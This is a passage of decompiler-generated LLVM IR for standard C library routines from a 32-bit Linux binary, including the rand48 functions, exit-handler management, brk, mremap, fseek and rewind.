dec_label_pc_8066455:                             ; preds = %dec_label_pc_8066152, %dec_label_pc_806613e, %dec_label_pc_8066447
  br label %dec_label_pc_8066458

dec_label_pc_8066458:                             ; preds = %dec_label_pc_806618c, %dec_label_pc_8066455
  %v0_806645b = load i32, i32* @ebx, align 4
  store i32 %v0_806645b, i32* %eax.global-to-local, align 4
  store i32 %v0_806612f, i32* @ebx, align 4
  store i32 %v0_806612e, i32* @esi, align 4
  store i32 %v0_806612d, i32* @edi, align 4
  store i32 %v0_806612c, i32* @ebp, align 4
  ret i32 %v0_806645b

; uselistorder directives
  uselistorder i32 %v1_806640f, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v1_80663e6, { 1, 0 }
  uselistorder i32 %v2_80663da, { 1, 0 }
  uselistorder i32 %v2_80663c5, { 0, 3, 1, 2 }
  uselistorder i32 %v0_80663bc, { 1, 0 }
  uselistorder i32 %v6_80663a1, { 1, 0, 2 }
  uselistorder i32 %v2_8066396, { 1, 0, 2 }
  uselistorder i32 %v1_8066376, { 2, 0, 1 }
  uselistorder i32 %v3_8066372, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8066331, { 1, 0 }
  uselistorder i32 %v1_8066297, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_806626b, { 1, 3, 2, 0, 4, 5, 6, 7 }
  uselistorder i32 %v2_806620f, { 1, 0, 2 }
  uselistorder i32 %v3_8066222, { 0, 2, 3, 1 }
  uselistorder i32 %v2_80661df, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_80661c1, { 12, 11, 13, 10, 1, 0, 7, 15, 2, 14, 3, 4, 5, 6, 9, 8, 16 }
  uselistorder i32 %v1_80661b9, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 13, 4, 0, 1, 9, 10, 8, 7, 2, 5, 3, 6, 12, 11 }
  uselistorder i32 %v1_80661ae, { 1, 0 }
  uselistorder i32 %v1_806619e, { 1, 2, 0 }
  uselistorder i32 %v0_8066187, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp8, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 5, 14, 15, 16, 17, 18 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 38, 41, 42, 43, 44, 0, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 ()* @abort, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 -2, { 55, 3, 8, 0, 52, 53, 1, 51, 57, 56, 4, 6, 5, 7, 50, 63, 2, 9, 10, 11, 54, 58, 59, 60, 61, 62, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32* @global_var_807f42c.682, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_8075530.598 to i32), { 4, 11, 0, 5, 1, 6, 2, 7, 12, 3, 8, 9, 10 }
  uselistorder i32 %arg2, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8066458, { 1, 0 }
  uselistorder label %dec_label_pc_8066455, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8066447, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_806643a, { 1, 0 }
  uselistorder label %dec_label_pc_806635d, { 1, 0 }
  uselistorder label %dec_label_pc_8066310, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80662fc, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8066255, { 1, 0 }
  uselistorder label %dec_label_pc_80661b5, { 1, 0 }
}

define i32 @lrand48_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_8066471 = inttoptr i32 %arg2 to i32*
  %v4_8066471 = call i32 @nrand48_r(i32 %arg1, i32 %arg1, i32* %v3_8066471)
  ret i32 %v4_8066471
}

define i32 @nrand48_r(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_806647c = load i32, i32* @ebx, align 4
  store i32 %v0_806647c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8066489 = inttoptr i32 %arg1 to i16*
  %v3_8066489 = call i32 @__drand48_iterate(i16* %v2_8066489, i32 %arg2)
  %v2_8066494 = icmp slt i32 %v3_8066489, 0
  br i1 %v2_8066494, label %dec_label_pc_80664af, label %dec_label_pc_8066498

dec_label_pc_8066498:                             ; preds = %entry
  %v0_8066498 = load i32, i32* @ebx, align 4
  %v1_8066498 = add i32 %v0_8066498, 4
  %v2_8066498 = inttoptr i32 %v1_8066498 to i16*
  %v3_8066498 = load i16, i16* %v2_8066498, align 2
  %v4_8066498 = zext i16 %v3_8066498 to i32
  %v1_806649c = add i32 %v0_8066498, 2
  %v2_806649c = inttoptr i32 %v1_806649c to i16*
  %v3_806649c = load i16, i16* %v2_806649c, align 2
  %v2_80664a0 = mul nuw i32 %v4_8066498, 32768
  %div = udiv i16 %v3_806649c, 2
  %v2_80664a3 = zext i16 %div to i32
  %v2_80664a5 = or i32 %v2_80664a3, %v2_80664a0
  store i32 %v2_80664a5, i32* %arg3, align 4
  br label %dec_label_pc_80664af

dec_label_pc_80664af:                             ; preds = %entry, %dec_label_pc_8066498
  %v0_80664af = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8066498 ]
  %v2_80664b3 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80664b3, i32* @ebx, align 4
  ret i32 %v0_80664af

; uselistorder directives
  uselistorder i32 32768, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80664af, { 1, 0 }
}

define i32 @__GI_srand48_r(i16 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v4_80664b8 = sext i16 %arg1 to i32
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_80664c2 = sdiv i32 %v4_80664b8, 65536
  store i32 %v2_80664c2, i32* @ecx, align 4
  %v3_80664c5 = add i32 %arg2, 2
  %v4_80664c5 = inttoptr i32 %v3_80664c5 to i16*
  store i16 %arg1, i16* %v4_80664c5, align 2
  %v0_80664cb = load i32, i32* @ecx, align 4
  %v1_80664cb = trunc i32 %v0_80664cb to i16
  %v2_80664cb = load i32, i32* %edx.global-to-local, align 4
  %v3_80664cb = add i32 %v2_80664cb, 4
  %v4_80664cb = inttoptr i32 %v3_80664cb to i16*
  store i16 %v1_80664cb, i16* %v4_80664cb, align 2
  %v0_80664cf = load i32, i32* %edx.global-to-local, align 4
  %v1_80664cf = inttoptr i32 %v0_80664cf to i16*
  store i16 13070, i16* %v1_80664cf, align 2
  %v0_80664d4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80664d4 = add i32 %v0_80664d4, 16
  %v2_80664d4 = inttoptr i32 %v1_80664d4 to i32*
  store i32 -554899859, i32* %v2_80664d4, align 4
  %v0_80664db = load i32, i32* %edx.global-to-local, align 4
  %v1_80664db = add i32 %v0_80664db, 20
  %v2_80664db = inttoptr i32 %v1_80664db to i32*
  store i32 5, i32* %v2_80664db, align 4
  %v0_80664e2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80664e2 = add i32 %v0_80664e2, 12
  %v2_80664e2 = inttoptr i32 %v1_80664e2 to i16*
  store i16 11, i16* %v2_80664e2, align 2
  %v0_80664e8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80664e8 = add i32 %v0_80664e8, 14
  %v2_80664e8 = inttoptr i32 %v1_80664e8 to i16*
  store i16 1, i16* %v2_80664e8, align 2
  ret i32 0
}

define i32 @__exit_handler(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80665351725 = load i32, i32* @global_var_807e078.782, align 8
  %v0_806653a1826 = load i32, i32* @global_var_807e07c.784, align 4
  %v1_80665401927 = icmp eq i32 %v0_80665351725, 0
  %v1_80665422129 = icmp eq i1 %v1_80665401927, false
  br i1 %v1_80665422129, label %dec_label_pc_80664fa.lr.ph, label %dec_label_pc_8066544

dec_label_pc_80664fa:                             ; preds = %dec_label_pc_80664fa.lr.ph, %dec_label_pc_8066535.backedge
  %v0_806653522 = phi i32 [ %v0_80665351731, %dec_label_pc_80664fa.lr.ph ], [ %v1_80664fa, %dec_label_pc_8066535.backedge ]
  %v1_80664fa = add i32 %v0_806653522, -1
  store i32 %v1_80664fa, i32* @global_var_807e078.782, align 8
  %v2_8066500 = mul i32 %v1_80664fa, 16
  %v2_8066503 = add i32 %v0_806653a1832, %v2_8066500
  %v1_8066506 = inttoptr i32 %v2_8066503 to i32*
  %v2_8066506 = load i32, i32* %v1_8066506, align 4
  %v9_8066508 = icmp eq i32 %v2_8066506, 2
  br i1 %v9_8066508, label %dec_label_pc_8066514, label %dec_label_pc_806650d

dec_label_pc_806650d:                             ; preds = %dec_label_pc_80664fa
  %v9_806650d = icmp eq i32 %v2_8066506, 3
  %v1_8066510 = icmp eq i1 %v9_806650d, false
  br i1 %v1_8066510, label %dec_label_pc_8066535.backedge, label %dec_label_pc_8066523

dec_label_pc_8066535.backedge:                    ; preds = %dec_label_pc_806650d, %dec_label_pc_8066514, %dec_label_pc_8066523
  %v1_8066540 = icmp eq i32 %v1_80664fa, 0
  %v1_8066542 = icmp eq i1 %v1_8066540, false
  br i1 %v1_8066542, label %dec_label_pc_80664fa, label %dec_label_pc_8066535.dec_label_pc_8066544_crit_edge

dec_label_pc_8066514:                             ; preds = %dec_label_pc_80664fa
  %v1_8066514 = add i32 %v2_8066503, 4
  %v2_8066514 = inttoptr i32 %v1_8066514 to i32*
  %v3_8066514 = load i32, i32* %v2_8066514, align 4
  %v1_8066517 = icmp eq i32 %v3_8066514, 0
  br i1 %v1_8066517, label %dec_label_pc_8066535.backedge, label %dec_label_pc_806651b

dec_label_pc_806651b:                             ; preds = %dec_label_pc_8066514
  br label %dec_label_pc_8066530

dec_label_pc_8066523:                             ; preds = %dec_label_pc_806650d
  %v1_8066523 = add i32 %v2_8066503, 4
  %v2_8066523 = inttoptr i32 %v1_8066523 to i32*
  %v3_8066523 = load i32, i32* %v2_8066523, align 4
  %v1_8066526 = icmp eq i32 %v3_8066523, 0
  br i1 %v1_8066526, label %dec_label_pc_8066535.backedge, label %dec_label_pc_806652a

dec_label_pc_806652a:                             ; preds = %dec_label_pc_8066523
  br label %dec_label_pc_8066530

dec_label_pc_8066530:                             ; preds = %dec_label_pc_806651b, %dec_label_pc_806652a
  %v4_8066530 = phi i32 [ %v3_8066523, %dec_label_pc_806652a ], [ %v3_8066514, %dec_label_pc_806651b ]
  call void @__pseudo_call(i32 %v4_8066530)
  %v0_806653517 = load i32, i32* @global_var_807e078.782, align 8
  %v0_806653a18 = load i32, i32* @global_var_807e07c.784, align 4
  %v1_806654019 = icmp eq i32 %v0_806653517, 0
  %v1_806654221 = icmp eq i1 %v1_806654019, false
  br i1 %v1_806654221, label %dec_label_pc_80664fa.lr.ph, label %dec_label_pc_8066544

dec_label_pc_80664fa.lr.ph:                       ; preds = %entry, %dec_label_pc_8066530
  %v0_806653a1832 = phi i32 [ %v0_806653a18, %dec_label_pc_8066530 ], [ %v0_806653a1826, %entry ]
  %v0_80665351731 = phi i32 [ %v0_806653517, %dec_label_pc_8066530 ], [ %v0_80665351725, %entry ]
  br label %dec_label_pc_80664fa

dec_label_pc_8066535.dec_label_pc_8066544_crit_edge: ; preds = %dec_label_pc_8066535.backedge
  br label %dec_label_pc_8066544

dec_label_pc_8066544:                             ; preds = %entry, %dec_label_pc_8066530, %dec_label_pc_8066535.dec_label_pc_8066544_crit_edge
  %v0_806653a.lcssa = phi i32 [ %v0_806653a1832, %dec_label_pc_8066535.dec_label_pc_8066544_crit_edge ], [ %v0_806653a1826, %entry ], [ %v0_806653a18, %dec_label_pc_8066530 ]
  %v1_806654b = call i32 @free(i32 %v0_806653a.lcssa)
  ret i32 %v1_806654b

; uselistorder directives
  uselistorder i32 %v2_8066503, { 1, 0, 2 }
  uselistorder i32 %v1_80664fa, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8066544, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80664fa.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_8066530, { 1, 0 }
  uselistorder label %dec_label_pc_8066535.backedge, { 2, 1, 0 }
}

define i32 @__new_exitfn() local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v2_806655e = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_806655e, i32* %stack_var_-44, align 4
  %v4_8066563 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-20, i32 134589241, i32 ptrtoint (i32* @global_var_8075620.710 to i32))
  store i32 ptrtoint (i32* @global_var_8075620.710 to i32), i32* %stack_var_-44, align 4
  %v1_806656f = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075620.710 to i32))
  %v0_8066574 = load i32, i32* @global_var_807e078.782, align 8
  %v0_806657c = load i32, i32* @global_var_807e080.785, align 128
  %v1_8066582 = add i32 %v0_8066574, 1
  %v5_8066585 = icmp slt i32 %v0_806657c, %v1_8066582
  br i1 %v5_8066585, label %dec_label_pc_8066587, label %entry.dec_label_pc_80665c0_crit_edge

entry.dec_label_pc_80665c0_crit_edge:             ; preds = %entry
  %v1_80665d5.pre = load i32, i32* @global_var_807e07c.784, align 4
  br label %dec_label_pc_80665c0

dec_label_pc_8066587:                             ; preds = %entry
  %v2_8066587 = mul i32 %v0_806657c, 16
  %v1_806658c = add i32 %v2_8066587, 320
  %v0_8066593 = load i32, i32* @global_var_807e07c.784, align 4
  store i32 %v0_8066593, i32* %stack_var_-44, align 4
  %v4_8066599 = inttoptr i32 %v0_8066593 to i32*
  %v5_8066599 = call i32 @realloc(i32* %v4_8066599, i32 %v1_806658c, i32 %v1_8066582, i32 %v1_8066582)
  %v1_80665a1 = icmp eq i32 %v5_8066599, 0
  store i32 %v5_8066599, i32* @ebx, align 4
  %v1_80665a5 = icmp eq i1 %v1_80665a1, false
  br i1 %v1_80665a5, label %dec_label_pc_80665b4, label %dec_label_pc_80665a7

dec_label_pc_80665a7:                             ; preds = %dec_label_pc_8066587
  %v0_80665a7 = load i32, i32* %stack_var_-44, align 4
  %v1_80665a7 = call i32 @__errno_location(i32 %v0_80665a7)
  %v1_80665ac = inttoptr i32 %v1_80665a7 to i32*
  store i32 12, i32* %v1_80665ac, align 4
  br label %dec_label_pc_80665e6

dec_label_pc_80665b4:                             ; preds = %dec_label_pc_8066587
  %v0_80665b4 = load i32, i32* @global_var_807e080.785, align 128
  %v1_80665b4 = add i32 %v0_80665b4, 20
  store i32 %v1_80665b4, i32* @global_var_807e080.785, align 128
  store i32 %v5_8066599, i32* @global_var_807e07c.784, align 4
  %v0_80665c0.pre = load i32, i32* @global_var_807e078.782, align 8
  br label %dec_label_pc_80665c0

dec_label_pc_80665c0:                             ; preds = %entry.dec_label_pc_80665c0_crit_edge, %dec_label_pc_80665b4
  %v1_80665d5 = phi i32 [ %v1_80665d5.pre, %entry.dec_label_pc_80665c0_crit_edge ], [ %v5_8066599, %dec_label_pc_80665b4 ]
  %v0_80665c0 = phi i32 [ %v0_8066574, %entry.dec_label_pc_80665c0_crit_edge ], [ %v0_80665c0.pre, %dec_label_pc_80665b4 ]
  store i32 134636784, i32* @global_var_807df04.711, align 4
  %v1_80665d1 = add i32 %v0_80665c0, 1
  %v2_80665d2 = mul i32 %v0_80665c0, 16
  %v2_80665d5 = add i32 %v2_80665d2, %v1_80665d5
  store i32 %v2_80665d5, i32* @ebx, align 4
  store i32 %v1_80665d1, i32* @global_var_807e078.782, align 8
  %v1_80665e0 = inttoptr i32 %v2_80665d5 to i32*
  store i32 1, i32* %v1_80665e0, align 4
  br label %dec_label_pc_80665e6

dec_label_pc_80665e6:                             ; preds = %dec_label_pc_80665a7, %dec_label_pc_80665c0
  store i32 %v2_806655e, i32* %stack_var_-44, align 4
  %v3_80665ef = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-20, i32 1)
  %v0_80665f7 = load i32, i32* @ebx, align 4
  ret i32 %v0_80665f7

; uselistorder directives
  uselistorder i32 %v5_8066599, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32*, i32, i32, i32)* @realloc, { 1, 0 }
  uselistorder i32 320, { 1, 0 }
  uselistorder i32* @global_var_807e07c.784, { 3, 4, 2, 1, 0 }
  uselistorder i32* @global_var_807e078.782, { 3, 2, 4, 1, 5, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8075620.710 to i32), { 2, 4, 0, 3, 1 }
  uselistorder label %dec_label_pc_80665e6, { 1, 0 }
  uselistorder label %dec_label_pc_80665c0, { 1, 0 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_80665fc = load i32, i32* @eax, align 4
  %v1_80665fc = add i32 %v0_80665fc, 28
  %v2_80665fc = inttoptr i32 %v1_80665fc to i32*
  %v3_80665fc = load i32, i32* %v2_80665fc, align 4
  store i32 %v3_80665fc, i32* @global_var_807f848.786, align 8
  %v1_8066605 = add i32 %v0_80665fc, 44
  %v2_8066605 = inttoptr i32 %v1_8066605 to i32*
  %v3_8066605 = load i32, i32* %v2_8066605, align 4
  store i32 %v3_8066605, i32* @global_var_807f84c.787, align 4
  ret i32 %v3_8066605
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8066610 = load i32, i32* @ebx, align 4
  store i32 %v0_8066610, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8066623 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8066623, i32* @global_var_807e084.732, align 4
  %v7_806662e = icmp ult i32 %v1_8066623, %arg1
  %v1_8066630 = icmp eq i1 %v7_806662e, false
  br i1 %v1_8066630, label %dec_label_pc_8066640, label %dec_label_pc_8066632

dec_label_pc_8066632:                             ; preds = %entry
  %v0_8066632 = load i32, i32* %stack_var_-4, align 4
  %v1_8066632 = call i32 @__errno_location(i32 %v0_8066632)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_806663a = inttoptr i32 %v1_8066632 to i32*
  store i32 12, i32* %v1_806663a, align 4
  %v0_8066641.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8066640

dec_label_pc_8066640:                             ; preds = %entry, %dec_label_pc_8066632
  %v0_8066641 = phi i32 [ 0, %entry ], [ %v0_8066641.pre, %dec_label_pc_8066632 ]
  %v2_8066644 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8066644, i32* @ebx, align 4
  ret i32 %v0_8066641

; uselistorder directives
  uselistorder i32 %v1_8066623, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_807e084.732, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8066640, { 1, 0 }
}

define i32 @__cmsg_nxthdr() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @edx, align 4
  %v1_8066651 = inttoptr i32 %tmp2 to i32*
  %v2_8066651 = load i32, i32* %v1_8066651, align 4
  %tmp5 = icmp ult i32 %v2_8066651, 12
  br i1 %tmp5, label %dec_label_pc_806667d, label %dec_label_pc_8066658

dec_label_pc_8066658:                             ; preds = %entry
  %v1_8066658 = add i32 %v2_8066651, 3
  %v1_806665b = and i32 %v1_8066658, -4
  %v2_806665e = add i32 %v1_806665b, %tmp2
  %v1_8066661 = add i32 %tmp, 20
  %v2_8066661 = inttoptr i32 %v1_8066661 to i32*
  %v3_8066661 = load i32, i32* %v2_8066661, align 4
  %v2_8066664 = add i32 %tmp, 16
  %v3_8066664 = inttoptr i32 %v2_8066664 to i32*
  %v4_8066664 = load i32, i32* %v3_8066664, align 4
  %v5_8066664 = add i32 %v4_8066664, %v3_8066661
  store i32 %v5_8066664, i32* @edx, align 4
  %v1_8066667 = add i32 %v2_806665e, 12
  %v6_806666c = icmp ugt i32 %v1_8066667, %v5_8066664
  br i1 %v6_806666c, label %dec_label_pc_806667d, label %dec_label_pc_806666e

dec_label_pc_806666e:                             ; preds = %dec_label_pc_8066658
  %v1_806666e = inttoptr i32 %v2_806665e to i32*
  %v2_806666e = load i32, i32* %v1_806666e, align 4
  %v1_8066670 = add i32 %v2_806666e, 3
  %v1_8066673 = and i32 %v1_8066670, -4
  %v2_8066676 = add i32 %v1_8066673, %v2_806665e
  %tmp6 = icmp ugt i32 %v2_8066676, %v5_8066664
  br i1 %tmp6, label %dec_label_pc_806667d, label %dec_label_pc_806667f

dec_label_pc_806667d:                             ; preds = %dec_label_pc_806666e, %dec_label_pc_8066658, %entry
  br label %dec_label_pc_806667f

dec_label_pc_806667f:                             ; preds = %dec_label_pc_806666e, %dec_label_pc_806667d
  %v0_8066680 = phi i32 [ %v2_806665e, %dec_label_pc_806666e ], [ 0, %dec_label_pc_806667d ]
  ret i32 %v0_8066680

; uselistorder directives
  uselistorder i32 %v2_806665e, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8066651, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_806667f, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8066684 = load i32, i32* @edi, align 4
  %v0_8066685 = load i32, i32* @esi, align 4
  store i32 %v0_8066685, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_806669d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_80666a5 = call i32 @mremap(i32 %v0_806669d, i32 %v0_8066685, i32 %v0_8066684, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_806669d, i32* @ebx, align 4
  store i32 %v6_80666a5, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v6_80666a5, -4095
  br i1 %tmp, label %dec_label_pc_80666bd, label %dec_label_pc_80666b1

dec_label_pc_80666b1:                             ; preds = %entry
  %v1_80666b1 = call i32 @__errno_location(i32 %v0_806669d)
  %v0_80666b6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80666b6 = sub i32 0, %v0_80666b6
  %v2_80666b8 = inttoptr i32 %v1_80666b1 to i32*
  store i32 %v1_80666b6, i32* %v2_80666b8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80666bd

dec_label_pc_80666bd:                             ; preds = %entry, %dec_label_pc_80666b1
  %v0_80666be = phi i32 [ %v6_80666a5, %entry ], [ -1, %dec_label_pc_80666b1 ]
  %v2_80666c0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80666c0, i32* @esi, align 4
  store i32 %v0_8066684, i32* @edi, align 4
  ret i32 %v0_80666be

; uselistorder directives
  uselistorder i32 %v6_80666a5, { 1, 0, 2 }
  uselistorder i32 %v0_806669d, { 1, 0, 2 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 54, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80666bd, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_80666cf = ashr i32 %arg2, 31
  %v4_80666d6 = inttoptr i32 %arg1 to i16*
  %v5_80666d6 = call i32 @__GI_fseeko64(i16* %v4_80666d6, i32 %arg2, i32 %v1_80666cf, i32 %arg3)
  ret i32 %v5_80666d6
}

define i32 @__GI_rewind(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_80666e0 = load i32, i32* @edi, align 4
  %v0_80666e2 = load i32, i32* @ebx, align 4
  %v4_80666e6 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80666e6, i32* @esi, align 4
  %v1_80666ea = add i32 %v4_80666e6, 52
  %v2_80666ea = inttoptr i32 %v1_80666ea to i32*
  %v3_80666ea = load i32, i32* %v2_80666ea, align 4
  store i32 %v3_80666ea, i32* @edi, align 4
  %v1_80666ed = icmp eq i32 %v3_80666ea, 0
  %v1_80666ef = icmp eq i1 %v1_80666ed, false
  br i1 %v1_80666ef, label %entry.dec_label_pc_8066710_crit_edge, label %dec_label_pc_80666f1

entry.dec_label_pc_8066710_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8066710

dec_label_pc_80666f1:                             ; preds = %entry
  %v1_80666f1 = add i32 %v4_80666e6, 56
  store i32 %v1_80666f1, i32* @ebx, align 4
  %v5_8066700 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134589241, i32 %v1_80666f1)
  %v0_8066705 = load i32, i32* @ebx, align 4
  %v2_8066708 = call i32 @pthread_mutex_lock(i32 %v0_8066705)
  %v0_8066710.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8066710

dec_label_pc_8066710:                             ; preds = %entry.dec_label_pc_8066710_crit_edge, %dec_label_pc_80666f1
  %v2_8066715 = phi i32 [ %v4_80666e6, %entry.dec_label_pc_8066710_crit_edge ], [ %v0_8066710.pre, %dec_label_pc_80666f1 ]
  %v1_8066710 = inttoptr i32 %v2_8066715 to i32*
  %v2_8066710 = load i32, i32* %v1_8066710, align 4
  %v2_8066710.tr = trunc i32 %v2_8066710 to i16
  %v1_8066715 = and i16 %v2_8066710.tr, -9
  %v3_8066715 = inttoptr i32 %v2_8066715 to i16*
  store i16 %v1_8066715, i16* %v3_8066715, align 2
  %v0_8066718 = load i32, i32* @edx, align 4
  %v0_806671d = load i32, i32* @esi, align 4
  %v5_806671e = call i32 @__GI_fseek(i32 %v0_806671d, i32 0, i32 0, i32 %v0_8066718)
  br i1 %v1_80666ef, label %dec_label_pc_806673b, label %dec_label_pc_806672a

dec_label_pc_806672a:                             ; preds = %dec_label_pc_8066710
  %v4_8066733 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  br label %dec_label_pc_806673b

dec_label_pc_806673b:                             ; preds = %dec_label_pc_8066710, %dec_label_pc_806672a
  %v0_8066741 = phi i32 [ %v5_806671e, %dec_label_pc_8066710 ], [ %v4_8066733, %dec_label_pc_806672a ]
  store i32 %v0_80666e2, i32* @ebx, align 4
  store i32 %v0_80666e0, i32* @edi, align 4
  ret i32 %v0_8066741

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__GI_fseek, { 1, 0 }
  uselistorder label %dec_label_pc_806673b, { 1, 0 }
  uselistorder label %dec_label_pc_8066710, { 1, 0 }
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8066764 = load i32, i32* @ebp, align 4
  %v0_8066765 = load i32, i32* @edi, align 4
  %v0_8066766 = load i32, i32* @esi, align 4
  %v0_8066767 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_8066777 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8066777, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_806679b, label %dec_label_pc_8066788

dec_label_pc_8066788:                             ; preds = %entry
  %v1_8066788 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_8066788, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @ebx, align 4
  %v1_8066790 = inttoptr i32 %v1_8066788 to i32*
  store i32 22, i32* %v1_8066790, align 4
  br label %dec_label_pc_8066841

dec_label_pc_806679b:                             ; preds = %entry
  %v1_806679b = add i32 %v4_8066777, 52
  %v2_806679b = inttoptr i32 %v1_806679b to i32*
  %v3_806679b = load i32, i32* %v2_806679b, align 4
  store i32 %v3_806679b, i32* @ebp, align 4
  %v1_806679e = icmp eq i32 %v3_806679b, 0
  %v1_80667a0 = icmp eq i1 %v1_806679e, false
